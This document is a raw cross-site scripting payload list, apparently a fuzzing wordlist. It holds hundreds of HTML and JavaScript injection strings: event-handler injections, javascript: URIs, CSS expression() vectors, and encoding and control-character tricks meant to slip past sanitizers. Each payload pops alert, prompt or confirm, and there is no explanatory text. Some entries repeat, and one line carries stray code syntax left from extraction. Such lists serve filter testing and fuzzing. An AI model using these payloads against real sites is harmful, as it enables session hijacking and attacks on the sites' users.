ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav    ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<IMG SRC="javascript:javascript:alert(1)"
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=javascript:javascript:alert(1);></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<var onmouseover="prompt(1)">On Mouse Over</var>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<form><button formaction=javascript&colon;alert(1)>CLICKME
‘; alert(1);
‘)alert(1);//
<ScRiPt>alert(1)</sCriPt>
<img src=xss onerror=alert(1)>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1)
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
